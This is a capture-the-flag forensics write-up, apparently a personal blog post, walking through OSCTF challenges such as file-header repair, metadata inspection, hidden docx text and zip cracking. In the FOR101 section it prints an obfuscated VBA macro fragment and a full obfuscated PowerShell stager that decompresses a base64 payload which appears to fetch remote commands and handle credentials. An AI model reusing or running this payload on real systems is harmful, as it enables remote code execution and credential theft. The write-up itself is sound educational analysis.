@@ -1,0 +1,170 @@
+---
+layout: post
+title: OSCTF
+tags: [Forensics]
+date:   2024-08-12 00:00:00
+excerpt: "OSCTF"
+feature: https://raw.githubusercontent.com/raviyelna/raviyelna.github.io/master/assets/img/background.jpg
+categories: CTFs
+---
+# OSCTF
+All the challenges: unavailable
+## The Lost Image Mystery
+
+![image](https://hackmd.io/_uploads/SyBRq4guC.png)
+![image](https://hackmd.io/_uploads/SJS-iEeuC.png)
+
+the challenge gave us a corrupted file so we need to fix it header 
+
+![image](https://hackmd.io/_uploads/ryvViVl_A.png)
+![image](https://hackmd.io/_uploads/BJTVsNxOC.png)
+
+With these evidence we can determine that this file is jpg picture so we just need to fix it header back and we will get the flag
+
+![image](https://hackmd.io/_uploads/S1LaoVeO0.png)
+
+---
+## The Hidden Soundwave
+
+![image](https://hackmd.io/_uploads/BklxhEluA.png)
+
+The challenge gave us an audio file, after listen to it there is a weird sound at the end of the song so I will open it in Sonic Visualizer and open spectogram to observe
+
+
+![image](https://hackmd.io/_uploads/H1DL2VgOA.png)
+
+---
+## Mysterious Website Incident
+
+![image](https://hackmd.io/_uploads/r1Tt24guR.png)
+
+the challenge gave us a log file after checking out the file, I found a suspicious link
+
+![image](https://hackmd.io/_uploads/HyHT2ExuR.png)
+
+open it we will get the flag
+
+![image](https://hackmd.io/_uploads/SyqkpVldC.png)
+
+---
+## Cyber Heist Conspiracy
+
+![image](https://hackmd.io/_uploads/SJiW6ExOR.png)
+![image](https://hackmd.io/_uploads/HyJvTVeOR.png)
+
+the challenge gave us a pcap file but the first thing that I notice is that there is packet comment
+
+![image](https://hackmd.io/_uploads/Bk2daVldC.png)
+
+open it up, we got the flag
+
+---
+## PDF Puzzle
+
+![image](https://hackmd.io/_uploads/HyCspVxO0.png)
+
+the challenge give us a PDF with some redacted word, after checking them out there nothing special I used exiftool and found the flag
+
+![image](https://hackmd.io/_uploads/Bkj1REldC.png)
+
+![image](https://hackmd.io/_uploads/H17BR4lO0.png)
+
+---
+## Seele Vellorei
+
+![image](https://hackmd.io/_uploads/HkIv0Ve_R.png)
+
+The challenge gave us a docx file so I will open it first
+I pressed ctrl + A to check for white colour text and found something suspicious and there is the flag
+
+![image](https://hackmd.io/_uploads/ryJJJSg_R.png)
+
+![image](https://hackmd.io/_uploads/SyrW1BeuR.png)
+
+---
+## FOR101
+![image](https://hackmd.io/_uploads/ryN4JBluA.png)
+
+The challenge gave us a folder contain all files of an user and said something about email so its must be a phishing attack, first I will be checking the outlook folder or you can use tree to find it easier
+
+![image](https://hackmd.io/_uploads/Hyz2kHgO0.png)
+![image](https://hackmd.io/_uploads/rkR01Hg_A.png)
+
+found it the eml file
+
+![image](https://hackmd.io/_uploads/rk8lZBxOC.png)
+
+unzip the file with the given password, there is a xlsm file kinda sus, using olevba to check it and yea its definately the reason
+
+![image](https://hackmd.io/_uploads/SJHtWHld0.png)
+
+I will dump all those macro code
+
+![image](https://hackmd.io/_uploads/Sk7yzreu0.png)
+
+it got encrypted or something I cant read those string beside the main code like "Function", "next",....
+I see that its trying to decode something
+```
+Function ªºº³¦º§°¹¢¸¡³®»¹¶¯¾£º¦£¥²´¼¦¥²·´©¡»¨´°¦¼®¬®«»·»¢¶¶¿®«¾¢·³§½¿¤½¿§¡¼«¼´ª³²¬¸®º¼¤¼¬¿¥§·«´¡¤´½¨(µ£³¯½°²ª²µº´©¤£¤¡½¯ª¸¯¿¦¤¢§¸®¼³¨¦¶¨¥³°©¢¾¾¡µ¼£¹£»©¶©£¦µ¥¹¢µ¹·½§²¶·¼¥¨º»¡´¾«½²¢¢£°¨)
+¯¨³³¿¯©¶¦»ª¹½¦¢¨»¸¸¸º²£²«µ¤¶¸¹µ«¶§¾¼µ®»¶¾ªºº³¦º§°¹¢¸¡³®»¹¶¯¾£º¦£¥²´¼¦¥²·´©¡»¨´°¦¼®¬®«»· = " ?!@#$%^&*()_+|0123456789abcdefghijklmnopqrstuvwxyz.,-~ABCDEFGHIJKLMNOPQRSTUVWXYZ¿¡²³ÀÁÂÃÄÅÒÓÔÕÖÙÛÜàáâãäåØ¶§Ú¥"
+»¢¶¶¿®«¾¢·³§½¿¤½¿§¡¼«¼´ª³²¬¸®º¼¤¼¬¿¥§·«´¡¤´½¨µ£³¯½°²ª²µº´©¤£¤¡½¯ª¸¯¿¦¤¢§¸®¼³¨¦¶¨¥³°©¢ = "ãXL1lYU~Ùä,Ca²ZfÃ@dO-cq³áÕsÄJV9AQnvbj0Å7WI!RBg§Ho?K_F3.Óp¥ÖePâzk¶ÛNØ%G mÜ^M&+¡#4)uÀrt8(ÒSw|T*Â$EåyhiÚx65Dà¿2ÁÔ"
+For y = 1 To Len(µ£³¯½°²ª²µº´©¤£¤¡½¯ª¸¯¿¦¤¢§¸®¼³¨¦¶¨¥³°©¢¾¾¡µ¼£¹£»©¶©£¦µ¥¹¢µ¹·½§²¶·¼¥¨º»¡´¾«½²¢¢£°¨)
+
+```
+![image](https://hackmd.io/_uploads/SyCfXSeuR.png)
+
+and this look like some kind of URL, so that function could be decode that URL, using this code to decode the string, open it will give us the flag.
+
+![image](https://hackmd.io/_uploads/SJ4uHrlu0.png)
+
+open up the link, there is somekind of bashscript, but it is encoded in base64
+
+![image](https://hackmd.io/_uploads/B1h9BBe_R.png)
+```
+& ( $sHEllid[1]+$sheLLiD[13]+'X')( NEW-obJEct Io.cOMPReSSiON.DEFlAteStrEAM( [SyStem.iO.mEMOrySTream] [SysteM.cOnVerT]::FRomBase64STRINg( 'JAAwAEwARABFAHgATgBpACAAPQAgACcASgBIAEYAMwBaAFcAUgBtAFkAWABvAGcAUABTAEEAbwBNAFQAQQAwAEwARABFAHgATgBpAHcAeABNAFQAWQBzAE0AVABFAHkATABEAEUAeABOAFMAdwAxAE8AQwB3ADAATgB5AHcAMABOAHkAdwB4AE0AVABJAHMATwBUAGMAcwBNAFQARQAxAEwARABFAHgATgBpAHcAeABNAEQARQBzAE8AVABnAHMATQBUAEEAMQBMAEQARQB4AE0AQwB3ADAATgBpAGsANwBKAEgARgAzAFoAVwBSAG0AWQBYAG8AZwBLAHoAMABnAEsARABFAHgATQBpAHcAeABNAEQAZwBzAE4ARABjAHMATQBUAEUANABMAEQARQB3AE4AUwB3AHgATQBEAEUAcwBNAFQARQA1AEwARABRADMATABEAEUAeABOAEMAdwA1AE4AeQB3AHgATQBUAGsAcwBOAEQAYwBzAE8AVABnAHMATQBUAEEAdwBMAEQAawA1AEwARABrADMATABEAFEANQBMAEQAVQAxAEwARABRADQATABEAFUAdwBLAFQAcwBrAFoAMgBGAHMAWgBpAEEAOQBJAEYAdABUAGUAWABOADAAWgBXADAAdQBWAEcAVgA0AGQAQwA1AEYAYgBtAE4AdgBaAEcAbAB1AFoAMQAwADYATwBrAEYAVABRADAAbABKAEwAawBkAGwAZABGAE4AMABjAG0AbAB1AFoAeQBnAGsAYwBYAGQAbABaAEcAWgBoAGUAaQBrADcASgBIAE0AOQBKAHoARQB5AE4AeQA0AHcATABqAEEAdQBNAFQAbwA0AE0ARABnAHcASgB6AHMAawBhAFQAMABuAFoAVwBWAG0ATwBHAFYAbQBZAFcATQB0AE0AegBJAHgAWgBEAFEAMgBOAFcAVQB0AFoAVABsAGsATQBEAFUAegBZAFQAYwBuAE8AeQBSAHcAUABTAGQAbwBkAEgAUgB3AE8AaQA4AHYASgB6AHMAawBkAGoAMQBKAGIAbgBaAHYAYQAyAFUAdABWADIAVgBpAFUAbQBWAHgAZABXAFYAegBkAEMAQQB0AFYAWABOAGwAUQBtAEYAegBhAFcATgBRAFkAWABKAHoAYQBXADUAbgBJAEMAMQBWAGMAbQBrAGcASgBIAEEAawBjAHkAOQBsAFoAVwBZADQAWgBXAFoAaABZAHkAQQB0AFMARwBWAGgAWgBHAFYAeQBjAHkAQgBBAGUAeQBKAFkATABUAFkANABNAEcAUQB0AE4ARABkAGwATwBDAEkAOQBKAEcAbAA5AE8AMwBkAG8AYQBXAHgAbABJAEMAZwBrAGQASABKADEAWgBTAGwANwBKAEcATQA5AEsARQBsAHUAZABtADkAcgBaAFMAMQBYAFoAVwBKAFMAWgBYAEYAMQBaAFgATgAwAEkAQwAxAFYAYwAyAFYAQwBZAFgATgBwAFkAMQBCAGgAYwBuAE4AcABiAG0AYwBnAEwAVgBWAHkAYQBTAEEAawBjAEMAUgB6AEwAegBNAHkATQBXAFEAMABOAGoAVgBsAEkAQwAxAEkAWgBXAEYAawBaAFgASgB6AEkARQBCADcASQBsAGcAdABOAGoAZwB3AFoAQwAwADAATgAyAFUANABJAGoAMABrAGEAWAAwAHAATABrAE4AdgBiAG4AUgBsAGIAbgBRADcAYQBXAFkAZwBLAEMAUgBqAEkAQwAxAHUAWgBTAEEAbgBUAG0AOQB1AFoAUwBjAHAASQBIAHMAawBjAGoAMQBwAFoAWABnAGcASgBHAE0AZwBMAFUAVgB5AGMAbQA5AHkAUQBXAE4AMABhAFcAOQB1AEkARgBOADAAYgAzAEEAZwBMAFUAVgB5AGMAbQA5AHkAVgBtAEYAeQBhAFcARgBpAGIARwBVAGcAWgBUAHMAawBjAGoAMQBQAGQAWABRAHQAVQAzAFIAeQBhAFcANQBuAEkAQwAxAEoAYgBuAEIAMQBkAEUAOQBpAGEAbQBWAGoAZABDAEEAawBjAGoAcwBrAGQARAAxAEoAYgBuAFoAdgBhADIAVQB0AFYAMgBWAGkAVQBtAFYAeABkAFcAVgB6AGQAQwBBAHQAVgBYAEoAcABJAEMAUgB3AEoASABNAHYAWgBUAGwAawBNAEQAVQB6AFkAVABjAGcATABVADEAbABkAEcAaAB2AFoAQwBCAFEAVAAxAE4AVQBJAEMAMQBJAFoAVwBGAGsAWgBYAEoAegBJAEUAQgA3AEkAbABnAHQATgBqAGcAdwBaAEMAMAAwAE4AMgBVADQASQBqADAAawBhAFgAMABnAEwAVQBKAHYAWgBIAGsAZwBLAEYAdABUAGUAWABOADAAWgBXADAAdQBWAEcAVgA0AGQAQwA1AEYAYgBtAE4AdgBaAEcAbAB1AFoAMQAwADYATwBsAFYAVQBSAGoAZwB1AFIAMgBWADAAUQBuAGwAMABaAFgATQBvAEoARwBVAHIASgBIAEkAcABJAEMAMQBxAGIAMgBsAHUASQBDAGMAZwBKAHkAbAA5AEkASABOAHMAWgBXAFYAdwBJAEQAQQB1AE8AWAAwAD0AJwA7ACQAMgBWAEMAWQBYAE4AcABZADEAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAMABMAEQARQB4AE4AaQApACkAOwAkAHMAawBjAGoAMQBQAGQAWABRAHQAIAA9ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBTAGUAYwB1AHIAZQBTAHQAcgBpAG4AZwAgAC0AUwB0AHIAaQBuAGcAIAAkADIAVgBDAFkAWABOAHAAWQAxACAALQBBAHMAUABsAGEAaQBuAFQAZQB4AHQAIAAtAEYAbwByAGMAZQA7ACQAVgB6AGQAQwBBAHQAVgBYAEoAcAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFAAUwBDAHIAZQBkAGUAbgB0AGkAYQBsACgAJwBkAFcAVgB6AGQAZAB6AEMAQQB0ACcALAAgACQAcwBrAGMAagAxAFAAZABYAFEAdAApADsAaQBlAHgAIAAkAFYAegBkAEMAQQB0AFYAWABKAHAALgBHAGUAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAKAApAC4AUABhAHMAcwB3AG8AcgBk' ) , [sySteM.IO.ComprESsiON.cOmpresSiONMODe]::dEcomPrEss)|fOReach-OBJECt{NEW-obJEct  iO.sTReAMrEAder( $_ , [TExT.EncOdiNg]::AscIi)} | fOREacH-obJeCt{$_.reADToend( )})
+```
+![image](https://hackmd.io/_uploads/BJ6aISgdC.png)
+
+and we got another base64 lol
+
+![image](https://hackmd.io/_uploads/rJ61PSxuA.png)
+
+Finally we got the code and theres a decimal string decode it will give us a link
+
+![image](https://hackmd.io/_uploads/SyJN_rx_A.png)
+![image](https://hackmd.io/_uploads/B1ES_BguC.png)
+
+here is the flag!
+
+---
+## Seele Vellorei - Revenge
+![image](https://hackmd.io/_uploads/S1JPdBluC.png)
+
+the challenge gave us a protected zip with password, using hashcat we know that the password is loveyou, open up the docx file inside the zip
+
+![image](https://hackmd.io/_uploads/Skqa_SluA.png)
+
+there is something behind Delta's picture
+
+![image](https://hackmd.io/_uploads/rkzktBlO0.png)
+
+we can change the extension name of the word file from docx to zip to take out the picture (do it by yourself lmao)
+using exiftool we can find something special
+
+![image](https://hackmd.io/_uploads/ByG8YSg_C.png)
+
+searching google about ciphernonce and you eventually find this 
+![image](https://hackmd.io/_uploads/rycg9Bl_R.png)
+
+reading through the comment, there is a similar case and a solution 
+
+![image](https://hackmd.io/_uploads/SkKv9rg_0.png)
+
+using the same password as the zip file we can now get the flag
+
+![image](https://hackmd.io/_uploads/r1P9jrxuC.png)
+
+![image2-imageonline.co-4544039](https://hackmd.io/_uploads/ByKjiHgOR.png)
+
+
+---
